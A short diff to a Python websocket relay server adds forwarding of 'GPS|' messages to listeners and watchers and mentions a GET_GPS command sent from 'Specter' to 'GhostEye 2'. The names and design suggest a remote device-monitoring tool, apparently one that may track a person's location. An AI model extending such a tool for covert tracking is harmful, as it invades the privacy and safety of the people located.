@@ -73,6 +73,17 @@ async def handle(request):
                             try: await w.send_str(txt)
                             except Exception: dead.add(w)
                         watchers.get(code, set()).difference_update(dead)
+                    elif txt.startswith("GPS|"):
+                        # ✅ Reenviar GPS al listener y watchers
+                        listener = listeners.get(code)
+                        if listener:
+                            try: await listener.send_str(txt)
+                            except Exception: listeners.pop(code, None)
+                        dead = set()
+                        for w in watchers.get(code, set()):
+                            try: await w.send_str(txt)
+                            except Exception: dead.add(w)
+                        watchers.get(code, set()).difference_update(dead)
                     else:
                         # Otros mensajes al listener
                         listener = listeners.get(code)
@@ -100,7 +111,7 @@ async def handle(request):
 
             async for msg in ws:
                 if msg.type == aiohttp.WSMsgType.TEXT:
-                    # Mensajes de Specter → GhostEye 2 (STOP, etc)
+                    # Mensajes de Specter → GhostEye 2 (STOP, GET_GPS, etc)
                     emitter = emitters.get(code)
                     if emitter:
                         try: await emitter.send_str(msg.data)
